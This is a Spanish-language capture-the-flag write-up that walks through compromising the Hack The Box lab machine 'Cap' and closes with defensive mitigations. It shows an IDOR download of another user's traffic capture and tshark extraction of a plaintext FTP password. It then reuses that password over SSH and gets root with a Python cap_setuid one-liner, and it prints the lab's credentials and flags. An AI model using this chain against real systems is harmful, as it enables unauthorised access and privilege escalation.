Cap — de un dashboard web a root

Resolución paso a paso: un panel web de monitorización de red con un IDOR permite descargar una captura de tráfico ajena; dentro viaja un login FTP en texto plano. Esas credenciales se reutilizan por SSH, y una Linux capability peligrosa (cap_setuid sobre Python) da root al instante.

SO: Ubuntu 20.04Dificultad: Fácil Servicios: FTP · SSH · HTTPTécnicas: IDOR · sniffing · capabilities
Nota IP: la IP de la máquina cambia en cada despliegue. En este writeup la máquina es 10.129.151.215 y el Kali atacante (tun0 de la VPN) es 10.10.15.193. Los comandos usan la variable $IP. Antes de nada, en la MISMA terminal ejecuta export IP=10.129.151.215 (pon la IP de tu máquina). Si abres una terminal nueva, vuelve a exportarla. Si olvidas este paso, $IP queda vacío y una URL como http://$IP/capture se convierte en http:///capture y falla.

00 Introducción

"Cap" es una máquina Linux de dificultad fácil de Hack The Box. La idea didáctica es encadenar cuatro fallos muy habituales en el mundo real:

  • IDOR (Insecure Direct Object Reference): la app numera los recursos y no comprueba de quién son, así que puedes pedir el recurso 0 y leer datos ajenos.
  • Protocolo en claro: FTP transmite usuario y contraseña sin cifrar; quien capture el tráfico los ve.
  • Reutilización de credenciales: la misma contraseña del FTP sirve para SSH.
  • Linux capability peligrosa: el binario de Python tiene cap_setuid, que permite cambiar el UID a 0 (root) sin ser root.

01 Preparación y conexión VPN

Hack The Box se accede por una VPN (OpenVPN). Conecta con tu fichero .ovpn y deja esa terminal abierta; se creará la interfaz tun0 con tu IP de atacante.

conectar la VPN (deja la terminal abierta)
$ sudo openvpn ~/Downloads/machines_us-1.ovpn
Explicación
  • sudo — OpenVPN necesita privilegios para crear la interfaz de red virtual tun0.
  • openvpn — cliente VPN que establece el túnel cifrado hacia el laboratorio.
  • ~/Downloads/machines_us-1.ovpn — tu fichero de configuración (certificados + servidor) que descargas de HTB.

En otra terminal, comprueba que tienes tun0 y que la máquina responde:

verificar conectividad
$ ip a show tun0 | grep inet
inet 10.10.15.193/23 ... scope global tun0
$ export IP=10.129.151.215
$ ping -c2 $IP
64 bytes from 10.129.151.215: icmp_seq=1 ttl=63 time=237 ms
Explicación
  • export IP=10.129.151.215 — guarda la IP del objetivo en una variable para escribir $IP en el resto de comandos y no repetirla. Debes ejecutarlo en la misma terminal donde uses los comandos.
  • ip a show tun0 — muestra la configuración de la interfaz de la VPN; grep inet filtra solo las líneas con tu IP.
  • ping -c2 $IP — envía 2 paquetes ICMP (-c2) para comprobar que la máquina está viva y medir latencia.
TTL ≈ 63: un TTL cercano a 64 indica que el objetivo es Linux (Windows suele rondar 128). Pista rápida del sistema operativo.

02 Reconocimiento con nmap

Primero un barrido rápido de todos los puertos TCP (-p-) con SYN scan y alta tasa de envío, para saber qué está abierto:

escaneo de todos los puertos
$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn $IP -oG allPorts
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
Explicación de cada flag
  • -p- — escanea los 65535 puertos TCP (no solo los 1000 habituales).
  • --open — muestra únicamente los puertos abiertos, ignora cerrados/filtrados.
  • -sS — SYN scan (sigiloso y rápido): no completa la conexión TCP.
  • --min-rate 5000 — fuerza al menos 5000 paquetes/seg para acelerar el barrido.
  • -n — no resuelve DNS (más rápido). -Pn — asume que el host está vivo y no hace ping previo.
  • -oG allPorts — guarda la salida en formato grepeable en el fichero allPorts.

Ahora versiones y scripts por defecto (-sCV) solo sobre los puertos abiertos:

versiones y scripts
$ sudo nmap -p21,22,80 -sCV -n -Pn $IP -oN services
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
Explicación de cada flag
  • -p21,22,80 — ahora escanea solo los puertos que ya sabemos abiertos (más rápido y preciso).
  • -sC — lanza los scripts por defecto de nmap (NSE) para sacar información extra.
  • -sV — detecta versión exacta de cada servicio (vsftpd 3.0.3, OpenSSH 8.2p1…).
  • -oN services — guarda la salida en formato normal/legible en el fichero services.
PuertoServicioObservación
21vsftpd 3.0.3FTP. Probamos acceso anónimo (acabó denegado).
22OpenSSH 8.2p1SSH. Sin creds todavía; lo guardamos para después.
80GunicornApp Python (Flask/Gunicorn) "Security Dashboard" → foco principal.
FTP anónimo (no funciona)
$ curl -s ftp://anonymous:anonymous@$IP/
530 Login incorrect.   # el acceso anónimo está deshabilitado
Explicación
  • curl -s — cliente HTTP/FTP en modo silencioso (-s, sin barra de progreso).
  • ftp://anonymous:anonymous@$IP/ — intenta listar el FTP con el usuario/clave anonymous (acceso invitado típico).
  • Respuesta 530 = login rechazado → el FTP no permite anónimos; necesitaremos credenciales reales (las sacaremos del PCAP).

03 Enumerar la aplicación web

El puerto 80 sirve un panel "Security Dashboard". En el menú lateral hay cuatro funciones:

RutaQué hace
/Dashboard (portada).
/ipMuestra la salida de ifconfig del servidor.
/netstatMuestra la salida de netstat (conexiones).
/capture"Security Snapshot": captura 5 s de tráfico con tcpdump y redirige a /data/<N>.

Al pulsar Security Snapshot, el servidor hace una captura y te redirige a una URL numerada. Fíjate en el Location de la respuesta:

lanzar captura y ver la redirección
$ curl -s -o /dev/null -w '%{redirect_url}\n' http://$IP/capture
http://10.129.151.215/data/1
Explicación
  • -s — modo silencioso.
  • -o /dev/null — descarta el cuerpo de la respuesta (no nos interesa el HTML aquí).
  • -w '%{redirect_url}\n' — imprime solo la URL de redirección (cabecera Location) que devuelve el servidor.
  • Resultado: vemos que /capture nos manda a /data/1 → el recurso se identifica con un número (pista del IDOR).

La página /data/<N> muestra estadísticas de la captura (nº de paquetes TCP/UDP…) y un botón Download que apunta a /download/<N>, el PCAP crudo.

Callejón sin salida (importante contarlo en clase): si solo lanzas /capture y descargas tu propia captura, el PCAP sale vacío (24 bytes, cero paquetes), porque en esos 5 s no pasa nada interesante por la red. Perseguir una tarea programada capturando una y otra vez no lleva a ningún sitio. La clave no es capturar nuevo tráfico, sino leer una captura ya existente.

04 El fallo: IDOR en /data/<N>

La app identifica cada captura con un número que simplemente va incrementando (1, 2, 3…) y no comprueba si esa captura es tuya. Eso es un IDOR: podemos pedir cualquier índice. ¿Y qué hay en el índice 0? Una captura que la propia máquina generó antes, con tráfico real.

descargar la captura nº 0 (IDOR)
$ curl -s http://$IP/download/0 -o cap0.pcap
$ file cap0.pcap
cap0.pcap: pcap capture file ... (9935 bytes)   # ¡esta sí tiene contenido!
Explicación
  • curl ... /download/0 — pedimos la captura con índice 0 (la del IDOR) en vez de la nuestra.
  • -o cap0.pcap — guarda el fichero descargado localmente como cap0.pcap.
  • file cap0.pcap — identifica el tipo de fichero; confirma que es un pcap y que pesa ~9,9 KB (tiene tráfico, no está vacío).
¿Por qué el 0? Los índices de usuario empiezan en 1, así que el 0 es "anterior a todo": una captura de referencia que dejó el sistema. Al no validar la propiedad del recurso, el 0 (y cualquier número) es accesible para cualquiera.

05 Credenciales FTP dentro del PCAP

FTP es un protocolo en texto plano: el usuario y la contraseña viajan tal cual. Abrimos la captura y filtramos por FTP. Con interfaz gráfica sería Wireshark (filtro ftp); por consola, con tshark:

extraer USER/PASS del FTP
$ tshark -r cap0.pcap -Y ftp -T fields \
       -e ftp.request.command -e ftp.request.arg | grep -iE 'USER|PASS'
USER    nathan
PASS    Buck3tH4TF0RM3!
Explicación de cada parte
  • tshark — la versión de consola de Wireshark (analizador de paquetes).
  • -r cap0.pcap — read: lee la captura desde el fichero en vez de la red en vivo.
  • -Y ftp — filtro de visualización: muestra solo paquetes del protocolo FTP.
  • -T fields -e ftp.request.command -e ftp.request.arg — saca en columnas el comando FTP y su argumento (p. ej. USER nathan).
  • | grep -iE 'USER|PASS' — filtra solo las líneas de usuario y contraseña (-i ignora mayúsculas, -E regex).
Alternativa en Wireshark: abre cap0.pcap, escribe ftp en el filtro, y mira los paquetes Request: USER nathan y Request: PASS .... O clic derecho en un paquete → Follow → TCP Stream para ver toda la conversación.
CREDS nathan : Buck3tH4TF0RM3!

06 Foothold: acceso por SSH

Aunque las credenciales son del FTP, muchos usuarios reutilizan la misma contraseña. Probamos SSH (más cómodo que FTP para trabajar) y entra:

login SSH como nathan
$ sshpass -p 'Buck3tH4TF0RM3!' ssh -o StrictHostKeyChecking=no nathan@$IP
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
nathan@cap:~$ cat user.txt
6fe30695c8a458f0ac89d667b7a32b02
Explicación
  • sshpass -p '...' — pasa la contraseña a SSH de forma no interactiva (evita que te la pida por teclado).
  • ssh nathan@$IP — abre sesión SSH como el usuario nathan en el objetivo.
  • -o StrictHostKeyChecking=no — acepta la clave del host sin preguntar (cómodo en labs; en producción no es recomendable).
  • id — confirma quién somos (uid 1001 nathan). cat user.txt — lee la primera flag.
USER 6fe30695c8a458f0ac89d667b7a32b02
Sin sshpass: también puedes ejecutar ssh nathan@$IP y teclear la contraseña a mano. sshpass solo evita el prompt.

07 Escalada a root: capability cap_setuid

Enumeramos las Linux capabilities: permisos finos que da un binario sin necesidad de SUID completo. Buscamos binarios con capabilities asignadas:

buscar capabilities en todo el sistema
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
...
Explicación
  • getcap — lista las capabilities asignadas a binarios (privilegios finos de root sin ser root).
  • -r / — recursivo desde la raíz /: busca en todo el sistema de ficheros.
  • 2>/dev/null — descarta los errores de "permiso denegado" para ver solo los resultados útiles.
  • Hallazgo clave: python3.8 = cap_setuid → ese Python puede cambiar su UID a 0 (root).

/usr/bin/python3.8 tiene cap_setuid. Esa capability permite al proceso cambiar su UID a 0 (root). Como Python puede llamar a os.setuid(0) y luego abrir una shell, nos convertimos en root directamente:

obtener shell de root
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# cat /root/root.txt
a40927ca90e65c54ad6c2ca4d35fc997
Explicación del one-liner
  • python3.8 -c '...' — ejecuta el código Python que va entre comillas, sin abrir un fichero.
  • import os — carga el módulo del sistema operativo.
  • os.setuid(0) — pone el UID del proceso a 0 (root). Solo funciona porque el binario tiene cap_setuid.
  • os.system("/bin/bash") — lanza una shell bash, que ya se ejecuta como root.
  • cat /root/root.txt — leemos la flag final de root.
ROOT a40927ca90e65c54ad6c2ca4d35fc997
¿Por qué funciona? Normalmente setuid(0) falla si no eres root. Pero cap_setuid le concede a ese binario justo ese privilegio. Python obedece, pone el UID efectivo a 0 y lanza /bin/bash ya como root. Referencia clásica: GTFOBins → python (capabilities).

09 Mitigaciones (lado defensa)

  • IDOR: validar que el recurso pertenece al usuario autenticado antes de servirlo; usar identificadores no predecibles (UUID) no sustituye a la comprobación de autorización.
  • Protocolos en claro: sustituir FTP por FTPS/SFTP; nunca transmitir credenciales sin cifrar por la red.
  • Reutilización de contraseñas: contraseñas distintas por servicio y, a ser posible, autenticación por clave SSH en vez de contraseña.
  • Capabilities: no asignar cap_setuid (ni SUID) a intérpretes como Python/Perl/Ruby; audítalo con getcap -r / de forma periódica.
